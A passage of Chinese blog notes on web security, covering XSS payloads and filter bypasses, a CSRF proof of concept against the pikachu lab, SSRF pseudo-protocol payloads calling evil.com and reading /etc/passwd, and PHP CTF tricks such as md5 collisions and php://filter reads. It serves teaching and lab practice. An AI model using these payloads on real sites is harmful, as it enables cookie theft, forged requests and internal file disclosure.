&lt;script&gt;alert(1)&lt;/script//\n\n\nXSS攻击载荷\nscript标签\n\n\n &lt;script&gt;标签是最直接XSS，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中\n\n&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss\n\n\nsvg标签\n\n&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;svg onload=&quot;alert(1)&quot;//\n\n\nimg标签\n\n&lt;img src=1 onerror=alert(&quot;hack&quot;)&gt;&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie\n\n\nbody标签\n\n&lt;body οnlοad=alert(1)&gt;&lt;body οnpageshοw=alert(1)&gt;\n\n\nvideo标签\n\n&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;\n\n\nstyle标签\n\n&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;\n\nXSS可以插在哪里\n用户输入作为script标签内容\n用户输入作为HTML注释内容\n用户输入作为HTML标签的属性名\n用户输入作为HTML标签的属性值\n用户输入作为HTML标签的名字\n直接插入到CSS里\n最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里\n\n#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过&lt;!-- 用户输入 --&gt;&lt;!-- --&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;!-- --&gt;#用户输入作为标签属性名，导致攻击者可以进行闭合绕过&lt;div 用户输入=&quot;xx&quot;&gt;  &lt;/div&gt;&lt;div &gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;xx&quot;&gt; &lt;/div&gt;#用户输入作为标签属性值，导致攻击者可以进行闭合绕过&lt;div id=&quot;用户输入&quot;&gt;&lt;/div&gt;&lt;div id=&quot;&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;x&quot;&gt;&lt;/div&gt;#用户输入作为标签名，导致攻击者可以进行闭合绕过&lt;用户输入  id=&quot;xx&quot; /&gt;&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;#用户输入作为CSS内容，导致攻击者可以进行闭合绕过&lt;style&gt;用户输入&lt;style&gt;&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;\n\nXSS攻击的分类\nXSS分为：存储型、反射型、DOM型\n\n\n存储型XSS：持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将存储到服务器中，用户访问该页面的时候出发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie\n反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在web页面。反射型XSS大多数是用来盗取用户的Cookie信息\nDOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型（DOM）的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射性XSS\n\nXSS的简单过滤和绕过区分大小写过滤标签//前端 1.html：&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;反射型XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;action4.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;//后端 action4.php：&lt;?php$name=$_POST[&quot;name&quot;]; if($name!=null)&#123;\t$name=preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;,$name);      //过滤&lt;script&gt;\t$name=preg_replace(&quot;/&lt;\\/script&gt;/&quot;,&quot;&quot;,$name);   //过滤&lt;/script&gt;\techo $name; &#125;?&gt;\n\n 绕过技巧：可以使用大小写绕过  &lt;scripT&gt;alert(&#39;hack&#39;)&lt;/scripT&gt;\n不区分大小写过滤标签$name=preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;,$name);    //不区分大小写过滤 &lt;script&gt;$name=preg_replace(&quot;/&lt;\\/script&gt;/i&quot;,&quot;&quot;,$name);  //不区分大小写过滤 &lt;/script&gt;\n\n绕过技巧：可以使用嵌套的script标签绕过&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;\n不区分大小写，过滤之间的所有内容$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); //过滤了&lt;script  及其之间的所有内容\n\n虽然无法使用&lt;script&gt;标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。\npayload： &lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;\n","categories":["网络安全"],"tags":["web安全"]},{"title":"CSRF&SSRF","url":"/post/5905ffd4.html","content":"\n\nCSRFCSRF跨站请求伪造CSRF解释\nCSRF（Cross-site Request Forgery，跨站请求伪造）是一种针对网站的恶意利用。CSRF攻击可以利用用户已经登陆或已经授权的状态，伪造合法用户发出请求给受信任的网点，从而实现在未授权的情况下执行一些特权操作。\n\nCSRF攻击流程\n用户浏览器登录站点A\n登陆成功后，服务器向用户浏览器发送cookie\n用户在没有登出网站A的情况下，访问攻击者B\n攻击者B要求访问站点A，发出一个请求Request\n根据在（4）中的要求，浏览器带着（2）步的cookie访问站点A\n\nCSRF分类\nCSRF(GET)型\nget型主要是通过URL恶意链接诱导用户点击，当用户处于访问网站的过程中，同时用户又点击了这个链接，那么就会触发修改。比如当用户正在修改密码，比如修改的URL:/user.php?id=1&amp;password=11111，意思就是用户把密码修改为1111，若攻击者把URL修改为URL:/user.php?id=1&amp;password=123456789，然后通过社工手段进行诱导点击我们修改后的链接，那么当用户访问这个链接后就会把密码修改为123456789。\n\nCSRF(POST)型同样是修改密码但是这次在URL中不会显示密码，而且是在post中，那么当攻击者对该网站进行抓包分析整个数据包的构造，然后把相关的内容修改为其他用户的相关参数，然后同样是诱导用户去点击我们精心准备的WEB界面，那么当点击的时候就会自动进行提交，使其密码再次修改。例如pikachu上构建的数据内容：\n\n\n&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;    &lt;form action=&quot;http://192.168.10.150/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;116266565656&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;nba&amp;#32;lakes&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;kobe&amp;#64;pikachu&amp;#46;com&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;\n\nSSRFSSRF是什么\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。\n一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n\nSSRF漏洞原理\nSSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\n比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器\n\n产生SSRF漏洞的函数file_get_contents()\n下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。\n\n&lt;?php\tif (isset($_POST[&#x27;url&#x27;])) \t&#123; \t\t$content = file_get_contents($_POST[&#x27;url&#x27;]); \t\t$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; \t\tfile_put_contents($filename, $content); \t\techo $_POST[&#x27;url&#x27;]; \t\t$img = &quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; \t&#125;     echo $img; ?&gt;\n\nfsockopen()\n以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。\n\n&lt;?php \tfunction GetFile($host,$port,$link) \t&#123; \t\t$fp = fsockopen($host, intval($port), $errno, errstr, 30); \t\tif (!$fp) &#123; \t\t\techo &quot;$errstr (error number $errno) \\n&quot;; \t\t&#125; else &#123; \t\t\t$out = &quot;GET $link HTTP/1.1\\r\\n&quot;; \t\t\t$out .= &quot;Host: $host\\r\\n&quot;; \t\t\t$out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; \t\t\t$out .= &quot;\\r\\n&quot;; \t\t\tfwrite($fp, $out); \t\t\t$contents=&#x27;&#x27;; \t\t\twhile (!feof($fp)) &#123; \t\t\t\t$contents.= fgets($fp, 1024);             &#125; \t\t\tfclose($fp); \t\t\treturn $contents; \t\t&#125; \t&#125;?&gt;\n\ncurl_exec()\ncURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。\n\n&lt;?php \tif (isset($_POST[&#x27;url&#x27;]))\t&#123;\t\t$link = $_POST[&#x27;url&#x27;];\t\t$curlobj = curl_init();\t\tcurl_setopt($curlobj, CURLOPT_POST, 0);\t\tcurl_setopt($curlobj,CURLOPT_URL,$link);\t\tcurl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);\t\t$result=curl_exec($curlobj);\t\tcurl_close($curlobj);\t\t$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;\t\tfile_put_contents($filename, $result); \t\techo $result;\t&#125;?&gt;\n\n注意事项\n一般情况下PHP不会开启fopen的gopher wrapperfile_get_contents的gopher协议不能URL编码file_get_contents关于Gopher的302跳转会出现bug，导致利用失败curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用curl_exec() 默认不跟踪跳转，file_get_contents() file_get_contents支持php://input协议\n\nSSRF在URL的伪协议\n当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议\n\nfile:/// 从文件系统中获取文件内容，如，file:///etc/passwddict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：sftp:// SSH文件传输协议或安全文件传输协议ldap:// 轻量级目录访问协议tftp:// 简单文件传输协议gopher:// 分布式文档传递服务，可使用gopherus生成payload\n\nfile\n可以尝试从文件系统中获取文件：\n\n\nhttp://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini\n\ndict\n能够引用允许通过DICT协议使用的定义或单词列表：\n\n\nhttp://example.com/ssrf.php?dict://evil.com:1337/evil.com:$ nc -lvp 1337Connection from [192.168.0.12] port 1337[tcp/*]accepted (family 2, sport 31126)CLIENT libcurl 7.40.0\n\nsftp\n在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。\n\n\nhttp://example.com/ssrf.php?url=sftp://evil.com:1337/evil.com:$ nc -lvp 1337Connection from [192.168.0.12] port 1337[tcp/*]accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2\n\nldap://或ldaps://或ldapi://\nLDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。\n\n\nhttp://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit\n\ntftp://\nTFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。\n\n\nhttp://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKETevil.com:# nc -lvup 1337Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3\n\ngopher://\nGopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。\n\n\nhttp://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-evil.com:# nc -lvp 1337Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest\n\nSSRF绕过方式@符号绕过\n在某地址1后添加@再次添加地址2，浏览器会自动返回地址2数据\n\n\nhttp://www.xxx.com@www.kxsy.work/\n\nIP地址转换\n对内网请求的IP地址进行各进制的编码这个网址可以进行在线转换\n\n\n例如：127.0.0.1二进制 = 1111111000000000000000000000001十六进制 = 7F000001十进制 = 2130706433\n\n转换短地址\nhttps://www.985.so/例：http://www.kxsy.work/ = http://u6.gg/ks69x\n\n特殊符号替换绕过\n例：http://www.kxsy.work/ = http://www。kxsy。work/localhost或者0.0.0.0\n\n利用句号绕过\nhttp://baidu.com/?url=http://192。168。10。150\n\n添加端口绕过\nhttp://baidu.com/?url=http://google.com:443\n\n利用[::]绕过\nhttp://baidu.com/?url=http://[::192.168.10.150]\n\n302跳转绕过&lt;?php  $schema = $_GET[&#x27;s&#x27;];$ip     = $_GET[&#x27;i&#x27;];$port   = $_GET[&#x27;p&#x27;];$query  = $_GET[&#x27;q&#x27;];if(empty($port))&#123;      header(&quot;Location: $schema://$ip/$query&quot;); &#125; else &#123;    header(&quot;Location: $schema://$ip:$port/$query&quot;); &#125;\n\nxip.io绕过：会将解析到子域http://10.0.0.1.xip.io = 10.0.0.1www.10.0.0.1.xip.io= 10.0.0.1http://mysite.10.0.0.1.xip.io = 10.0.0.1foo.http://bar.10.0.0.1.xip.io = 10.0.0.110.0.0.1.xip.name resolves to 10.0.0.1www.10.0.0.2.xip.name resolves to 10.0.0.2foo.10.0.0.3.xip.name resolves to 10.0.0.3bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4\n","categories":["网络安全"],"tags":["web安全"]},{"title":"PHP特性","url":"/post/44659fec.html","content":"\n\n正则表达式元字符\n\n\n符号\n描述\n\n\n\n\\d\n匹配任意一个十进制数字，等价于[0-9]\n\n\n\\D\n匹配任意一个除十进制数字以外的字符，等价于[^0-9]\n\n\n\\s\n匹配任意一个空白字符，等价于[\\f\\n\\r\\t\\v]\n\n\n\\S\n匹配除空白字符以外任何一个字符，等价于[^\\f\\n\\r\\t\\v]\n\n\n\\w\n匹配任意一个数字、字母或下划线，等价于[0-9a-zA-Z]\n\n\n\\W\n匹配除数字、字母或下划线以外的任意一个字符，等价于[^0-9a-zA-Z]\n\n\n*\n匹配0次、1次或多次其前面的原子\n\n\n+\n匹配1次或多次其前面的原子\n\n\n?\n匹配0次或1次其前面的原子\n\n\n.\n匹配除了换行符外的任意一个字符\n\n\n|\n匹配两个或多个分支选择\n\n\n{n}\n表示其前面的原子恰好出现n次\n\n\n{n,}\n表示其前面的原子出现不少于n次\n\n\n{n,m}\n表示其前面的原子至少出现n次，最多出现m次\n\n\n^或\\A\n匹配输入字符串的开始位置（或在多行模式下的开头，即紧随一换行符之后）\n\n\n$或\\Z\n匹配输入字符串的结束位置（或在多行模式下的结尾，即紧随一换行符之前）\n\n\n\\b\n匹配单词的边界\n\n\n\\B\n匹配出单词边界以外的部分\n\n\n[]\n匹配方括号中指定的任意一个原子\n\n\n[^]\n匹配出方括号中的原子以外的任意一个字符\n\n\n()\n匹配其政体为一个原子，即模式单元，可以理解为由多个单个原子组成的大原子\n\n\n模式修正符\n\n\n符号\n描述\n\n\n\ni\n在和模式进行匹配时不区分大小写\n\n\nm\n将字符串视为多行，默认的正则开始”^”和结束”$”将目标字符串作为单一的一 “行” 字符（甚至其中包含有换行符也是如此）；如果在修饰符中加上”m”，那么开始和结束将会指字符串的每一行，每一行的开头就是”^”，结尾就是”$”\n\n\ns\n如果设定了此字符，模式中的圆点元字符”.”匹配所有的字符，包括换行符,即将字符串视为单行，换行符作为普通字符看待\n\n\nx\n模式中的空白忽略不计，除非它已经被转义\n\n\ne\n只用在pre_replace()函数中，在替换字符串中对逆向引用做正常的替换，将其作为PHP代码求值，并用其结果来替换所搜索的字符串\n\n\nU\n贪婪模式，最大限度匹配\n\n\nD\n模式中的”$”仅匹配目标字符串的结尾，没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前；如果设定了m修正字符则忽略此选项\n\n\n贪婪匹配与惰性匹配\n贪婪匹配：匹配尽可能多的字符\n惰性匹配：匹配尽可能少的字符\n“?”：如果紧跟在任何量词*、+、?或{}的后面，会使量词编程惰性，例如对”123abc”使用/\\d+/将会匹配”123”，而使用/\\d+?/只会匹配到”1”\n\n\n\n\n函数符\n描述\n\n\n\n*?\n零次或多次，但尽可能少的匹配\n\n\n+?\n一次或多次，但尽可能少的匹配\n\n\n??\n0次或1次，但尽可能少的匹配\n\n\n{n,}?\n至少n次，但尽可能少的匹配\n\n\n{n,m}?\nn到m次 ，但尽可能少的匹配\n\n\n函数preg_match()数组绕过\npreg_match()只能处理字符串，当传入的subject是数组时会返回false\n\nif(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;\n\npayload: num[]=1\n换行绕过if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;\n\npayload: cmd=%0aphp\n最大回溯次数绕过\nPHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。\n\nintval()\n获取变量的整数值\n\n成功时返回 var 的 integer 值，失败时返回 0，空的 array 返回 0，非空的 array 返回 1\n\n\n&lt;?phpecho intval(42);                      // 42echo intval(4.2);                     // 4echo intval(&#x27;42&#x27;);                    // 42echo intval(&#x27;+42&#x27;);                   // 42echo intval(&#x27;-42&#x27;);                   // -42echo intval(042);                     // 34echo intval(&#x27;042&#x27;);                   // 42echo intval(1e10);                    // 1410065408echo intval(&#x27;1e10&#x27;);                  // 1echo intval(0x1A);                    // 26echo intval(42000000);                // 42000000echo intval(420000000000000000000);   // 0echo intval(&#x27;420000000000000000000&#x27;); // 2147483647echo intval(42, 8);                   // 42echo intval(&#x27;42&#x27;, 8);                 // 34echo intval(array());                 // 0echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1echo intval(false);                   // 0echo intval(true);                    // 1?&gt;\n\n字符绕过\nintval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。\n\nif($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;\n\npayload: num=4476a\n科学计数法\nintval()函数如果base为0，则var中存在字母的话遇到字母就停止读取，但是e这个字母比较特殊，可以在PHP中表示科学计数法。\n\nif($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;\n\npayload: num=4476e1\n进制转换\n0b?? : 二进制0??? : 八进制0X?? : 十六进制\n\nif($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;\n\npayload: num=010574\n小数点绕过if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;\n\npayload: num=4476.0\nstrpos()strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）\n\n\n利用+代替空格绕过\n\nmd5\nmd5绕过\n\n弱比较\n只要两个数的md5加密后的值以0e开头就可以绕过，因为php在进行弱类型比较时,会现转换字符串的类型，在进行比较，而在比较是因为两个数都是以0e开头会被认为是科学计数法，0e后面加任何数在科学计数法中都是0，所以两数相等\n\n在这样的弱比较里，0e开头的会被识别成科学计数法，结果均为0，比较时0=0为true绕过\n\n\n240610708:0e462097431906509019562988736854QLTHNDT:0e405967825401955372549139051580QNKCDZO:0e830400451993494058024219903391PJNPDWY:0e291529052894702774557631701704NWWKITQ:0e763082070976038347657360817689NOOPCJF:0e818888003657176127862245791911MMHUWUV:0e701732711630150438129209816536MAUXXQC:0e478478466848439040434801845361\n\n强比较\n数组绕过\n如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null=null为true绕过\n\nmd5碰撞if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;])===md5($_GET[&#x27;b&#x27;]))&#123;\techo $flag;&#125;\n\n真实md5碰撞，因为此时不能输入数组了，只能输入字符串\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n\nin_array()\n搜索数组中是否存在指定的值。\n\n没有设置第三个参数时就可以形成自动转换\n\neg:x=1.php自动转换为1\n\n\nphp弱比较var_dump()\n显示变量相关信息\n如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行\n如果该字符串以合法的数值开始，则使用该数值，否则其值为0。\n\n\n\n字符串和数字比较var_dump(&#x27;a&#x27; == 0);\t//bool(true)var_dump(&#x27;1a&#x27; == 1);\t//bool(true)var_dump(&#x27;12a&#x27; == 1);\t//bool(false)\n\n\n会出现上面的结果是因为字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成false，false又和0弱类型比较是相等的，所以第一个是true。\n但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。\n\n布尔true和任意比较var_dump(True == 0);\t//bool(false)var_dump(True == &#x27;False&#x27;);\t//bool(true)var_dump(True == 2);\t//bool(true)\n\n\nbool 1和任何比较都相等，除了0和false，因为0也认为是bool false，true是不等于false的，所以第一条是false，其余的全是true。\n\nhash值和字符串“0”比较\nhash: 哈希算法\n特点：\n对于特定的hash算法输出结果的长度总是一定的；\n对于相同的输入内容不管执行多少次hash函数，总会得到相同的hash值；\n对于输入字符串哪怕及其微小的变动也会引起输出结果巨大的变化\n哈希过程是单向的，即不能通过特定的函数从hash值恢复出原始数据。\n\n\n常见的hash算法: MD5、SHA1、SHA224、SHA256、SHA512等\n\n$str1 = &quot;a&quot;;echo md5($str1);\t//0cc175b9c0f1b6a831c399e269772661var_dump(md5($str1) == &#x27;0&#x27;);\t//bool(false)---------------------------------------------------------$str2 = &quot;s224534898e&quot;;echo md5($str2);\t//0e420233178946742799316739797882var_dump(md5($str2) == &#x27;0&#x27;);\t//bool(true)---------------------------------------------------------$str3 = &#x27;a1b2edaced&#x27;;echo md5($str3);\t//0e45ea817f33691a3dd1f46af81166c4boolvar_dump(md5($str3) == &#x27;0&#x27;);\t//bool(false)---------------------------------------------------------var_dump(&#x27;0e111111111111&#x27; == &#x27;0&#x27;);\t//bool(true) \n\n\n只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0。\n所以当hash出来的32个值，开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的。\n第一条只是0开头，所以只能当普通字符串，结果为false。\n第二条0e后面全为数字，符合要求，结果为true。\n第三条虽然为0e，但是后面不全为数字，所以结果为false。\n\n优先级符号\n&amp;&amp;与||的优先级高于=\n=的优先级高于and与or\n\n$bA = true;$bB = false;$b1 = $bA and $bB;$b2 = $bA &amp;&amp; $bB;var_dump($b1); // $b1 = truevar_dump($b2); // $b2 = false$bA = false;$bB = true;$b3 = $bA or $bB;$b4 = $bA || $bB;var_dump($b3); // $b3 = falsevar_dump($b4); // $b4 = true\n\nget post\nhttp协议默认先以get方式获取数据，无论是否以哪种方式发起的，总是get方式优先，即通过get方式获取到了数据就不会再去通过post方式获取一遍，如果get方式获取不到，再以post方式获取。\n\nReflectionClass反射类&lt;?phpclass A&#123;public static $flag=&quot;flag&#123;123123123&#125;&quot;;const  PI=3.14;static function hello()&#123;    echo &quot;hello&lt;/br&gt;&quot;;&#125;&#125;$a=new ReflectionClass(&#x27;A&#x27;);var_dump($a-&gt;getConstants());  //获取一组常量输出 array(1) &#123;  [&quot;PI&quot;]=&gt;  float(3.14)&#125;var_dump($a-&gt;getName());    //获取类名输出string(1) &quot;A&quot;var_dump($a-&gt;getStaticProperties()); //获取静态属性输出array(1) &#123;  [&quot;flag&quot;]=&gt;  string(15) &quot;flag&#123;123123123&#125;&quot;&#125;var_dump($a-&gt;getMethods()); //获取类中的方法输出array(1) &#123;  [0]=&gt;  object(ReflectionMethod)#2 (2) &#123;    [&quot;name&quot;]=&gt;    string(5) &quot;hello&quot;    [&quot;class&quot;]=&gt;    string(1) &quot;A&quot;  &#125;&#125;\n\ncall_user_func回调函数\ncall_user_func(callback,parameter)：callback：被调用的回调函数，其余参数是回调函数的参数，尝试用hex2bin()作为回调函数（16进制转化为字符）\n\nPHP伪协议写文件\n配合file_put_contents(v 3 , v3,v3,str);函数 //在需要base64转换的时候\n\nv3=php://filter/write=convert.base64-decode/resource=1.php&amp;str=......\n\n读文件function filter($file)&#123;    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;\n\n\n通常使用：\n\nphp://filter/read=convert.base64-encode/resource=flag.php\n\n当ban掉base64的时候，我们还可以用其他编码方式（或者不编码）：\n\nphp://filter/resource=flag.php\t\tphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.phpphp://filter/read=convert.quoted-printable-encode/resource=flag.php\t//可打印字符引用编码compress.zlib://flag.php\t\t//压缩流\n\nis_file()函数\n判断是否为文件\n\nphp伪协议绕过\nhighlight_file()可以识别php伪协议 is_file()不能识别php伪协议\n\n/proc/self/root\n在linux中/proc/self/root是指向根目录的 也就是如果在命令行中输入 ls /proc/self/root其实显示的内容是根目录下的内容 多次重复后绕过is_file\n\nfile=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\nparse_str()\n把查询字符串解析到变量中\n\n&lt;?phpparse_str(&quot;name=Bill&amp;age=60&quot;);echo $name.&quot;&lt;br&gt;&quot;;echo $age;?&gt;结果Bill60\n\n\n若要post参数，需加引号v1=&#39;flag=0&#39;\n\nereg()截断漏洞if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;    die(&#x27;error&#x27;);&#125;if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;\n\npayload: c=a%00778    反转后：c=877=0x36d\n\nstrrev()：反转字符串，常出现在%00截断漏洞中注：%00是一个整体，不会反转成00% \n\nException异常处理类\n和ReflectionClass反射类用法相似，该类中常用的成员函数如下所示：\n\ngetMessage()：返回异常的消息内容；getCode()：以数字形式返回异常代码；getFile()：返回发生异常的文件名；getLine()：返回发生错误的代码行号；getTrace()：返回 backtrace() 数组；getTraceAsString()：返回已格式化成字符串的、由函数 getTrace() 函数所产生的信息；__toString()：产生异常的字符串信息，它可以重载。注意，该函数最前部是两个下划线。\n\n\n可以和system连用：Reflectionclass(system(&#39;cat 